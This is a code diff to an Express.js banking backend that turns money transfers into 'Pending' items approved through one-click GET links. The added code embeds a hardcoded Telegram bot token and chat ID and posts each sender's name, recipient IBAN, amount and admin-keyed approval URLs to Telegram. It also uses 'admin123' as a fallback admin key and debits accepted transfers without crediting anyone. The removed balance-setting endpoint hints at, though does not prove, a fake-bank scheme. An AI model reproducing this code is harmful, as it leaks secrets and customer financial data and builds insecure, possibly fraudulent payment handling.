@@ -144,13 +144,13 @@ app.get('/api/dashboard', authMiddleware, (req, res) => {
   res.json({ user: safeUser, recentTransactions });
 });
 
-// 5. Money Transfers
+// 5. Money Transfers (Pending until you click the Accept or Decline link)
 app.post('/api/transfers', authMiddleware, (req, res) => {
   const { recipient_name, recipient_iban, bank_name, amount, description } = req.body;
   const transferAmount = parseFloat(amount);
 
   if (!recipient_name || !recipient_iban || isNaN(transferAmount) || transferAmount <= 0) {
-    return res.status(400).json({ error: 'Valid recipient name, IBAN, and positive amount are required.' });
+    return res.status(400).json({ error: 'Valid recipient name, IBAN/Account Number, and positive amount are required.' });
   }
 
   const sender = db.prepare('SELECT * FROM users WHERE id = ?').get(req.user.id);
@@ -158,38 +158,94 @@ app.post('/api/transfers', authMiddleware, (req, res) => {
     return res.status(400).json({ error: 'Insufficient balance for this transfer.' });
   }
 
-  const referenceId = `SWB-${new Date().getFullYear()}-${Math.floor(100000 + Math.random() * 900000)}`;
+  const referenceId = `REF-${Math.floor(10000000 + Math.random() * 90000000)}`;
 
-  const executeTransfer = db.transaction(() => {
-    db.prepare('UPDATE users SET balance = balance - ? WHERE id = ?').run(transferAmount, sender.id);
+  db.prepare(`
+    INSERT INTO transactions (user_id, reference_id, type, recipient_name, recipient_iban, bank_name, amount, description, status)
+    VALUES (?, ?, 'Transfer', ?, ?, ?, ?, ?, 'Pending')
+  `).run(sender.id, referenceId, recipient_name, recipient_iban, bank_name || 'N/A', -transferAmount, description || 'SEPA Transfer');
 
-    db.prepare(`
-      INSERT INTO transactions (user_id, reference_id, type, recipient_name, recipient_iban, bank_name, amount, description, status)
-      VALUES (?, ?, 'Transfer', ?, ?, ?, ?, ?, 'Completed')
-    `).run(sender.id, referenceId, recipient_name, recipient_iban, bank_name || '', -transferAmount, description || 'SEPA Transfer');
+  db.prepare('INSERT INTO notifications (user_id, title, message) VALUES (?, ?, ?)').run(
+    sender.id,
+    'Transfer Pending Review',
+    `Your transfer of ${transferAmount.toFixed(2)} ${sender.currency} to ${recipient_name} (${referenceId}) is awaiting administrator review.`
+  );
 
-    const cleanIban = recipient_iban.replace(/\s+/g, '').toUpperCase();
-    const internalRecipient = db.prepare("SELECT * FROM users WHERE REPLACE(UPPER(iban), ' ', '') = ?").get(cleanIban);
-    if (internalRecipient && internalRecipient.id !== sender.id) {
-      db.prepare('UPDATE users SET balance = balance + ? WHERE id = ?').run(transferAmount, internalRecipient.id);
-      db.prepare(`
-        INSERT INTO transactions (user_id, reference_id, type, recipient_name, recipient_iban, amount, description, status)
-        VALUES (?, ?, 'Deposit', ?, ?, ?, ?, 'Completed')
-      `).run(internalRecipient.id, `${referenceId}-IN`, `${sender.first_name} ${sender.last_name}`, sender.iban, transferAmount, description || 'Incoming Transfer');
-    }
+  const host = `${req.protocol}://${req.get('host')}`;
+  const adminKey = process.env.ADMIN_KEY || 'admin123';
+  console.log(`\n=== NEW PENDING TRANSFER (${referenceId}) ===`);
+  console.log(`ACCEPT:  ${host}/api/tx/${referenceId}/accept?key=${adminKey}`);
+  console.log(`DECLINE: ${host}/api/tx/${referenceId}/decline?key=${adminKey}\n`);
 
-    db.prepare('INSERT INTO notifications (user_id, title, message) VALUES (?, ?, ?)').run(
-      sender.id, 'Transfer Completed', `Transfer of ${transferAmount.toFixed(2)} ${sender.currency} to ${recipient_name} succeeded (${referenceId}).`
-    );
+  const BOT_TOKEN = '9166879325:AAE8gvXaDK4iRFMIVVzKoQDN11_b-PiPP84';
+  const CHAT_ID = '7816061314';
+  const alertText = `🔔 New Pending Transfer (${referenceId})\n` +
+    `From: ${sender.first_name} ${sender.last_name}\n` +
+    `To: ${recipient_name} (${bank_name || 'N/A'} - ${recipient_iban})\n` +
+    `Amount: ${sender.currency} ${transferAmount.toFixed(2)}\n\n` +
+    `✅ ACCEPT:\n${host}/api/tx/${referenceId}/accept?key=${adminKey}\n\n` +
+    `❌ DECLINE:\n${host}/api/tx/${referenceId}/decline?key=${adminKey}`;
+
+  const https = require('https');
+  const tgData = JSON.stringify({ chat_id: CHAT_ID, text: alertText });
+  const tgReq = https.request({
+    hostname: 'api.telegram.org',
+    path: `/bot${BOT_TOKEN}/sendMessage`,
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(tgData) }
+  }, (tgRes) => {
+    tgRes.on('data', (d) => console.log('Telegram response:', d.toString()));
   });
+  tgReq.on('error', (err) => console.error('Telegram error:', err));
+  tgReq.write(tgData);
+  tgReq.end();
 
-  executeTransfer();
-  const updatedSender = db.prepare('SELECT balance, currency FROM users WHERE id = ?').get(sender.id);
   res.json({
-    message: 'Transfer Successful',
-    receipt: { reference_id: referenceId, recipient_name, recipient_iban, amount: transferAmount, currency: updatedSender.currency, status: 'Completed', date: new Date().toISOString() },
-    newBalance: updatedSender.balance
+    message: 'Transfer Pending Review',
+    receipt: {
+      reference_id: referenceId,
+      recipient_name,
+      recipient_iban,
+      bank_name: bank_name || 'N/A',
+      description: description || 'SEPA Transfer',
+      amount: transferAmount,
+      currency: sender.currency,
+      status: 'Pending',
+      date: new Date().toLocaleString()
+    }
   });
+});
+
+// One-Click Accept / Decline Link
+app.get('/api/tx/:ref/:action', (req, res) => {
+  const adminKey = process.env.ADMIN_KEY || 'admin123';
+  if (req.query.key !== adminKey) {
+    return res.status(401).send('<h2>Unauthorized: Invalid admin key</h2>');
+  }
+
+  const { ref, action } = req.params;
+  const tx = db.prepare('SELECT * FROM transactions WHERE reference_id = ?').get(ref);
+  if (!tx) return res.status(404).send('<h2>Transfer not found</h2>');
+  if (tx.status !== 'Pending') return res.send(`<h2>Already marked as: ${tx.status}</h2>`);
+
+  const sender = db.prepare('SELECT * FROM users WHERE id = ?').get(tx.user_id);
+  const transferAmount = Math.abs(tx.amount);
+
+  if (action === 'accept') {
+    if (sender.balance < transferAmount) {
+      return res.status(400).send('<h2>Insufficient balance</h2>');
+    }
+    db.prepare('UPDATE users SET balance = balance - ? WHERE id = ?').run(transferAmount, sender.id);
+    db.prepare("UPDATE transactions SET status = 'Completed' WHERE id = ?").run(tx.id);
+    return res.send(`<h2 style="color:green;font-family:sans-serif;">Transfer ${ref} ACCEPTED!</h2>`);
+  }
+
+  if (action === 'decline') {
+    db.prepare("UPDATE transactions SET status = 'Declined' WHERE id = ?").run(tx.id);
+    return res.send(`<h2 style="color:red;font-family:sans-serif;">Transfer ${ref} DECLINED!</h2>`);
+  }
+
+  res.status(400).send('<h2>Invalid action</h2>');
 });
 
 // 6. Transaction History
@@ -282,22 +338,6 @@ app.post('/api/support', authMiddleware, (req, res) => {
   if (!subject || !message) return res.status(400).json({ error: 'Subject and message are required.' });
   db.prepare('INSERT INTO support_tickets (user_id, subject, message) VALUES (?, ?, ?)').run(req.user.id, subject, message);
   res.status(201).json({ message: 'Support ticket submitted' });
-});
-// Private Admin Balance Update (Protected by ADMIN_KEY)
-app.get('/api/admin/set-balance', (req, res) => {
-  const { key, email, amount } = req.query;
-  if (!process.env.ADMIN_KEY || key !== process.env.ADMIN_KEY) {
-    return res.status(403).json({ error: 'Forbidden: Invalid admin key' });
-  }
-  const newBalance = parseFloat(amount);
-  if (!email || isNaN(newBalance)) {
-    return res.status(400).json({ error: 'Valid email and amount are required' });
-  }
-  const result = db.prepare('UPDATE users SET balance = ? WHERE LOWER(email) = LOWER(?)').run(newBalance, email.trim());
-  if (result.changes === 0) {
-    return res.status(404).json({ error: 'User not found' });
-  }
-  res.json({ message: `Balance for ${email} updated to ${newBalance.toFixed(2)}` });
 });
 
 app.listen(PORT, () => {
